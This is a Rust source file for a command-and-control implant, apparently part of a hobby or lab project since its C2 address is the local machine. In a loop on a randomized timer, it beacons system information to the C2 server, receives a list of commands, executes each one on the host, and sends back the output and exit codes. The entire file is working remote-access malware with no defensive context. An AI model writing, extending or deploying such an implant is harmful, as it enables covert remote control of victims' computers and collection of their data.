use std::{io::Write, net::TcpStream, process::Command, thread::sleep, time::Duration};

const C2_ADDRESS: &str = "127.0.0.1:9120";

use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode, read_packet};
use rand::{Rng, rng};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    loop {
        sleep(Duration::from_secs(
            rng().random_range(IMPLANT_REPORT_RATE_SECONDS),
        ));

        let mut connection = connect();
        connection
            .write(
                encode(Packet::Beacon {
                    system_info: SystemInfo::get(),
                })
                .unwrap()
                .as_slice(),
            )
            .unwrap();

        let packet = read_packet(&mut connection).unwrap();

        match packet {
            Packet::CommandList { commands } => {
                let mut results = Vec::new();
                for command in commands {
                    println!("({command})");
                    let command = Command::new(command).output();

                    if command.is_err() {
                        continue;
                    }

                    let command = command.unwrap();

                    println!("{}", String::from_utf8_lossy(command.stdout.as_slice()));
                    results.push((
                        String::from_utf8_lossy(command.stdout.as_slice()).into(),
                        command.status.code().unwrap(),
                    ));
                }
                println!("Results sent");
                connect()
                    .write(
                        encode(Packet::CommandResults { results })
                            .unwrap()
                            .as_slice(),
                    )
                    .unwrap();
            }

            _ => {}
        }
    }
}

fn connect() -> TcpStream {
    loop {
        let stream = TcpStream::connect(C2_ADDRESS);
        if stream.is_err() {
            println!("Failed to estabilish a connection to the C2, retrying in a minute...");
            sleep(Duration::from_secs(if cfg!(debug_assertions) {
                1
            } else {
                60
            }));
            continue;
        }

        return stream.unwrap();
    }
}
